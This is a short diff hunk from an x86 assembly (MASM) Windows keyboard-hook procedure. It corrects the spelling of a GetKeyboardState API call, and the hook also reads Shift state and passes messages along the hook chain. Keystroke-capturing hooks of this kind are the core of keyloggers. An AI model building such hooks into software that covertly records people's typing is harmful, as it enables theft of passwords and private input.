@@ -50,7 +50,7 @@ HookProc        proc        _dwCode,_wParam,_lParam
 
 ;               将消息传递给下一个钩子，钩子链
                 invoke      CallNextHookEx,hHook,_dwCode,_wParam,_lParam
-                invoke      GetKeyBoardState,addr @szKeyState
+                invoke      GetKeyboardState,addr @szKeyState
                 invoke      GetKeyState,VK_SHIFT
                 mov         @szKeyState + VK_SHIFT,al
                 mov         ecx,_lParam
